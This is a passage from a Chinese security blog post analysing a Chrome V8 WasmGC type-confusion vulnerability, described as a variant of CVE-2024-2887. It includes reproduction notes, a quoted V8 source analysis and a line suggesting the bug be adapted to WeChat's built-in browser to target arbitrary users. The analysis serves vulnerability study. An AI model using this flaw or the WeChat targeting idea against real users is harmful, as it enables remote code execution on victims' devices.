<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Google Chrome RCE——CVE-2024-2887的变体漏洞, 你的朋友的博客">
    <meta name="description" content="Chrome-RCE-Poc概述
漏洞名称：Google Chrome 沙箱穿越
CVE编号：多个CVE组合攻击
威胁类型：代码执行
利用可能性：高
POC状态：已公开
在野利用状态：未公开
EXP状态：已公开
技术细节状态：已公开
危害描">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Google Chrome RCE——CVE-2024-2887的变体漏洞 | 你的朋友的博客</title>
    <link rel="icon" type="image/jpeg" href="/images/profile_photo/1.jpeg">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/css/post.css">



    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="你的朋友的博客" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/images/profile_photo/4.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">你的朋友的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/images/profile_photo/4.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">你的朋友的博客</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/topK-li/topK-li.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/topK-li/topK-li.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Google Chrome RCE——CVE-2024-2887的变体漏洞</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="container content">

    
    <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/POC/">
                                <span class="chip bg-color">POC</span>
                            </a>
                        
                            <a href="/tags/EXP/">
                                <span class="chip bg-color">EXP</span>
                            </a>
                        
                            <a href="/tags/Chrome/">
                                <span class="chip bg-color">Chrome</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
                                漏洞
                            </a>
                        
                            <a href="/categories/%E6%BC%8F%E6%B4%9E/PWN/" class="post-category">
                                PWN
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-08-27
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="Chrome-RCE-Poc概述"><a href="#Chrome-RCE-Poc概述" class="headerlink" title="Chrome-RCE-Poc概述"></a>Chrome-RCE-Poc概述</h2><ul>
<li>漏洞名称：Google Chrome 沙箱穿越</li>
<li>CVE编号：多个CVE组合攻击</li>
<li>威胁类型：代码执行</li>
<li>利用可能性：高</li>
<li>POC状态：已公开</li>
<li>在野利用状态：未公开</li>
<li>EXP状态：已公开</li>
<li>技术细节状态：已公开</li>
<li>危害描述：攻击者可通过诱导用户打开恶意链接来利用此漏洞，从而获取敏感信息或代码执行。</li>
</ul>
<p>This can be considered a variant bug of CVE-2024-2887 discovered by Manfred Paul and presented in Vancouver 2024.</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>++Chrome版本v125.0.6422.113++<br>Exp中内核偏移量需满足<code>chrome_leak &amp; 0xffff == 0xfd00</code><br><img src="/images/2024/08/28/64f839b7-68a7-420a-af98-30e2b18bea6f.png"><br>提供个思路：<br>微信中内置浏览器为大版本122的Chrome，通过Debug找到该版本偏移量来进行利用，就可以在微信想给谁弹计算器就给谁弹了</p>
<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>WASM 等递归规范类型<code>id</code>&lt;-&gt; <code>wasm::HeapType</code>&#x2F; <code>wasm::ValueTypeJS</code> 到 <code>WASM</code> 的转换函数及其包装器（<code>FromJS()</code>、<code>(Wasm)JSToWasmObject()</code>等）中的混淆，导致任意 <code>WASM</code>类型之间的类型混淆。<br>这可以被认为是 <code>Manfred Paul</code> 发现并在 2024 年温哥华会议上提出的<code>CVE-2024-2887</code>的变种漏洞。</p>
<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>独立安全研究员 <code>Seunghyun Lee (@0x10n)</code> 参加 <code>SSD Secure Disclosure</code> 的<code>TyphoonPWN 2024</code></p>
<h2 id="供应商回应"><a href="#供应商回应" class="headerlink" title="供应商回应"></a>供应商回应</h2><p>供应商已在 Google Chrome 版本 124 中发布了针对此漏洞的修复程序</p>
<h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>Google Chrome 123 及更早版本</p>
<h2 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h2><p><a target="_blank" rel="noopener" href="https://github.com/WebAssembly/gc/blob/main/proposals/gc/MVP.md">WasmGC 中的类型</a>经过规范化，以允许跨模块类型检查。由于 WasmGC 允许同递归类型，因此需要支持位于不同模块中各自的递归组之间的类型比较。V8 通过将单个隔离中所有模块的所有类型“规范化”为唯一标识的索引<code>uint32_t</code>来实现这一点。此过程在<a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/canonical-types.cc">https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/canonical-types.cc</a> 中实现，但一个非常简单的 TL;DR 将是：</p>
<ol>
<li>根据以下规则规范化递归组中的类型索引：</li>
<li>类型索引已定义（在其递归组之外）-&gt; 使用已规范化的值</li>
<li>代表同一组内不同类型的类型索引 -&gt; 从第一个类型计算相对类型索引并标记为相对</li>
<li>如果数据库中已存在规范化递归组，则使用已保存的索引</li>
<li>否则，将递归组保存到数据库中并创建新的索引（增量）<br>通过这种方式，WasmGC 支持结构类型等价的概念——即，当以任何顺序规范化时<code>(type $t1 (struct (mut i32) (mut i64)))</code>，来自模块 M1 的等价于<code>(type $t2 (struct (mut i32) (mut i64)))</code>来自模块 M2 的等价，将其扩展到更复杂的递归组，并且该想法仍然成立。<br>全局规范化数据库由单例类管理<code>TypeCanonicalizer</code>：<pre class="language-c" data-language="c"><code class="language-c">TypeCanonicalizer<span class="token operator">*</span> <span class="token function">GetTypeCanonicalizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">GetWasmEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">type_canonicalizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

class TypeCanonicalizer <span class="token punctuation">&#123;</span>
 public<span class="token operator">:</span>
  <span class="token keyword">static</span> constexpr <span class="token class-name">uint32_t</span> kPredefinedArrayI8Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">static</span> constexpr <span class="token class-name">uint32_t</span> kPredefinedArrayI16Index <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">static</span> constexpr <span class="token class-name">uint32_t</span> kNumberOfPredefinedTypes <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token comment">//...</span>
 private<span class="token operator">:</span>
  <span class="token comment">//...</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint32_t</span><span class="token operator">></span> canonical_supertypes_<span class="token punctuation">;</span>
  <span class="token comment">// Maps groups of size >=2 to the canonical id of the first type.</span>
  std<span class="token operator">::</span>unordered_map<span class="token operator">&lt;</span>CanonicalGroup<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token punctuation">,</span> base<span class="token operator">::</span>hash<span class="token operator">&lt;</span>CanonicalGroup<span class="token operator">>></span>
      canonical_groups_<span class="token punctuation">;</span>
  <span class="token comment">// Maps group of size 1 to the canonical id of the type.</span>
  std<span class="token operator">::</span>unordered_map<span class="token operator">&lt;</span>CanonicalSingletonGroup<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token punctuation">,</span>
                     base<span class="token operator">::</span>hash<span class="token operator">&lt;</span>CanonicalSingletonGroup<span class="token operator">>></span>
      canonical_singleton_groups_<span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
规范类型 ID <code>uint32_t</code>是类型的全局唯一ID代表隔离内的特定 WasmGC 类型。<code>canonical_supertypes_</code>是一个表示类型之间子类型关系的向量，其中<code>canonical_supertypes_[sub] = super</code>sub表示是（规范类型 ID 中的所有）super的超类型。</li>
</ol>
<p>每个 WASM 模块都保存一个向量，用于将其内部类型索引转换为规范化类型索引：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">V8_EXPORT_PRIVATE</span> WasmModule <span class="token punctuation">&#123;</span>
  <span class="token comment">//...</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>TypeDefinition<span class="token operator">></span> types<span class="token punctuation">;</span>  <span class="token comment">// by type index</span>
  <span class="token comment">// Maps each type index to its global (cross-module) canonical index as per</span>
  <span class="token comment">// isorecursive type canonicalization.</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint32_t</span><span class="token operator">></span> isorecursive_canonical_type_ids<span class="token punctuation">;</span>
  <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>在这种情况下，<code>isorecursive_canonical_type_ids[t] = c</code>意味着类型索引<code>t</code>被规范化为类型 id <code>c</code>。<br>注意，单个WASM模块可以拥有的最大类型索引数<code>t</code>是<code>kV8MaxWasmTypes</code>，即<code>1000000</code>。这在解码阶段<code>DecodeTypeSection()</code>中强制执行。然而，一个重要的观察结果是，规范类型id没有以任何方式绑定到<code>kV8MaxWasmTypes</code>——它可以根据主机内存支持的大小增长到主机内存支持的最大数量，因此我们可以简单地制作更多具有不同类型的 WASM 模块。<br>快速外部引用可以查看如何<code>isorecursive_canonical_type_ids</code>使用返回<code>WasmWrapperGraphBuilder::FromJS()</code>、运行时函数<code>WasmJSToWasmObject()</code>调用<code>JSToWasmObject()</code>等。查看前者，我们看到以下代码：</p>
<pre class="language-c" data-language="c"><code class="language-c">Node<span class="token operator">*</span> <span class="token function">FromJS</span><span class="token punctuation">(</span>Node<span class="token operator">*</span> input<span class="token punctuation">,</span> Node<span class="token operator">*</span> js_context<span class="token punctuation">,</span> wasm<span class="token operator">::</span>ValueType type<span class="token punctuation">,</span>
             <span class="token keyword">const</span> wasm<span class="token operator">::</span>WasmModule<span class="token operator">*</span> module<span class="token punctuation">,</span> Node<span class="token operator">*</span> frame_state <span class="token operator">=</span> nullptr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">case</span> wasm<span class="token operator">::</span>kRef<span class="token operator">:</span>
    <span class="token keyword">case</span> wasm<span class="token operator">::</span>kRefNull<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">heap_representation_non_shared</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//...</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kNone<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kNoFunc<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kI31<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kAny<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kFunc<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kStruct<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kArray<span class="token operator">:</span>
        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kEq<span class="token operator">:</span>
        <span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// Make sure ValueType fits in a Smi.</span>
          <span class="token function">static_assert</span><span class="token punctuation">(</span>wasm<span class="token operator">::</span>ValueType<span class="token operator">::</span>kLastUsedBit <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> kSmiValueSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">has_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">DCHECK_NOT_NULL</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">uint32_t</span> canonical_index <span class="token operator">=</span>
                module<span class="token operator">-></span>isorecursive_canonical_type_ids<span class="token punctuation">[</span>type<span class="token punctuation">.</span><span class="token function">ref_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            type <span class="token operator">=</span> wasm<span class="token operator">::</span>ValueType<span class="token operator">::</span><span class="token function">RefMaybeNull</span><span class="token punctuation">(</span>canonical_index<span class="token punctuation">,</span>           <span class="token comment">// [!] canonical type id used as wasm::HeapType</span>
                                                 type<span class="token punctuation">.</span><span class="token function">nullability</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>

          Node<span class="token operator">*</span> inputs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
              input<span class="token punctuation">,</span> <span class="token function">mcgraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">IntPtrConstant</span><span class="token punctuation">(</span>
                         <span class="token function">IntToSmi</span><span class="token punctuation">(</span>static_cast<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">raw_bit_field</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

          <span class="token keyword">return</span> <span class="token function">BuildCallToRuntimeWithContext</span><span class="token punctuation">(</span>Runtime<span class="token operator">::</span>kWasmJSToWasmObject<span class="token punctuation">,</span>
                                               js_context<span class="token punctuation">,</span> inputs<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//...</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>在 JS 到 Wasm 转换边界上，此函数已设置为运行。请注意，<code>canonical_index</code>引用类型的规范索引如何包装到<code>wasm::ValueType::RefMaybeNull()</code>并传递给运行时函数，<code>WasmJSToWasmObject()</code>最终达到<code>JSToWasmObject()</code>。<br><code>wasm::ValueType</code>定义如下：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// A ValueType is encoded by two components: a ValueKind and a heap</span>
<span class="token comment">// representation (for reference types/rtts). Those are encoded into 32 bits</span>
<span class="token comment">// using base::BitField. The underlying ValueKind enumeration includes four</span>
<span class="token comment">// elements which do not strictly correspond to value types: the two packed</span>
<span class="token comment">// types i8 and i16, the void type (for control structures), and a bottom value</span>
<span class="token comment">// (for internal use).</span>
<span class="token comment">// ValueType encoding includes an additional bit marking the index of a type as</span>
<span class="token comment">// relative. This should only be used during type canonicalization.</span>
class ValueType <span class="token punctuation">&#123;</span>
 public<span class="token operator">:</span>
  <span class="token comment">//...</span>
  <span class="token keyword">static</span> constexpr ValueType <span class="token function">RefMaybeNull</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> heap_type<span class="token punctuation">,</span>
                                          Nullability nullability<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">DCHECK</span><span class="token punctuation">(</span><span class="token function">HeapType</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ValueType</span><span class="token punctuation">(</span>
        KindField<span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span>nullability <span class="token operator">==</span> kNullable <span class="token operator">?</span> kRefNull <span class="token operator">:</span> kRef<span class="token punctuation">)</span> <span class="token operator">|</span>
        HeapTypeField<span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                          <span class="token comment">// [!]</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">//...</span>
  <span class="token comment">/**************************** Static constants ******************************/</span>
  <span class="token keyword">static</span> constexpr <span class="token keyword">int</span> kLastUsedBit <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>
  <span class="token keyword">static</span> constexpr <span class="token keyword">int</span> kKindBits <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  <span class="token keyword">static</span> constexpr <span class="token keyword">int</span> kHeapTypeBits <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>

  <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">intptr_t</span> kBitFieldOffset<span class="token punctuation">;</span>

 private<span class="token operator">:</span>
  <span class="token comment">// &#123;hash_value&#125; directly reads &#123;bit_field_&#125;.</span>
  friend <span class="token class-name">size_t</span> <span class="token function">hash_value</span><span class="token punctuation">(</span>ValueType type<span class="token punctuation">)</span><span class="token punctuation">;</span>

  using KindField <span class="token operator">=</span> base<span class="token operator">::</span>BitField<span class="token operator">&lt;</span>ValueKind<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> kKindBits<span class="token operator">></span><span class="token punctuation">;</span>
  using HeapTypeField <span class="token operator">=</span> KindField<span class="token operator">::</span>Next<span class="token operator">&lt;</span><span class="token class-name">uint32_t</span><span class="token punctuation">,</span> kHeapTypeBits<span class="token operator">></span><span class="token punctuation">;</span>                   <span class="token comment">// [!] HeapType, 20 bits wide</span>
  <span class="token comment">// Marks a type as a canonical type which uses an index relative to its</span>
  <span class="token comment">// recursive group start. Used only during type canonicalization.</span>
  using CanonicalRelativeField <span class="token operator">=</span> HeapTypeField<span class="token operator">::</span>Next<span class="token operator">&lt;</span>bool<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">></span><span class="token punctuation">;</span>
  <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>我们现在清楚地看到，<code>heap_type</code>实际上并非设计用于存储范围为 的规范类型 ID <code>uint32_t</code>，而是设计用于存储<code>wasm::HeapType</code>– 两种类型表示（规范化类型 ID 与类型索引）之间存在混淆。由于<code>wasm::HeapType</code>始终可以用 20 位表示，因此初始化程序（和 getter，在代码片段中省略）始终将此值截断为 20 位。</p>
<p>这导致了第一个可利用的漏洞——JS-to-Wasm 类型检查可能会混淆规范类型 id<code>t1</code>和<code>t2``if (t1 &amp; 0xfffff) == (t2 &amp; 0xfffff)</code>。具体来说，对于经过类型检查以接收规范类型 id 的对象<code>tn = t0 + 0x100000 * n</code>其中<code>0 &lt; t0 &lt; 0x100000</code>，它会改为使用截断的执行运行时类型检查<code>t0</code>。简而言之，类型<code>t0</code>及其子类型的对象可以绕过类型检查<code>tn</code>并通过 JS-to-Wasm 转换，从而导致进一步的类型混淆。</p>
<p>但是还有另一个可利用的漏洞，比使用索引环绕要简单得多。代码将规范类型 id 与 混淆<code>wasm::HeapType</code>，那么是否存在将规范类型 id 误用为 的情况<code>wasm::HeapType</code>？当然有，按照调用链进行操作即可<code>JSToWasmObject()</code>：</p>
<pre class="language-c" data-language="c"><code class="language-c">class HeapType <span class="token punctuation">&#123;</span>
 public<span class="token operator">:</span>
  <span class="token keyword">enum</span> <span class="token class-name">Representation</span> <span class="token operator">:</span> <span class="token class-name">uint32_t</span> <span class="token punctuation">&#123;</span>
    kFunc <span class="token operator">=</span> kV8MaxWasmTypes<span class="token punctuation">,</span>  <span class="token comment">// shorthand: c</span>
    kEq<span class="token punctuation">,</span>                      <span class="token comment">// shorthand: q</span>
    kI31<span class="token punctuation">,</span>                     <span class="token comment">// shorthand: j</span>
    kStruct<span class="token punctuation">,</span>                  <span class="token comment">// shorthand: o</span>
    kArray<span class="token punctuation">,</span>                   <span class="token comment">// shorthand: g</span>
    kAny<span class="token punctuation">,</span>                     <span class="token comment">//                                    // [!] top type ("any")</span>
    kExtern<span class="token punctuation">,</span>                  <span class="token comment">// shorthand: a.</span>
    <span class="token comment">//...</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span>

namespace wasm <span class="token punctuation">&#123;</span>
MaybeHandle<span class="token operator">&lt;</span>Object<span class="token operator">></span> <span class="token function">JSToWasmObject</span><span class="token punctuation">(</span>Isolate<span class="token operator">*</span> isolate<span class="token punctuation">,</span> Handle<span class="token operator">&lt;</span>Object<span class="token operator">></span> value<span class="token punctuation">,</span>
                                   ValueType expected_canonical<span class="token punctuation">,</span>
                                   <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> error_message<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//...</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span>expected_canonical<span class="token punctuation">.</span><span class="token function">heap_representation_non_shared</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//...</span>
    <span class="token keyword">case</span> HeapType<span class="token operator">::</span>kAny<span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                          <span class="token comment">// [!] all non-null JS values allowed</span>
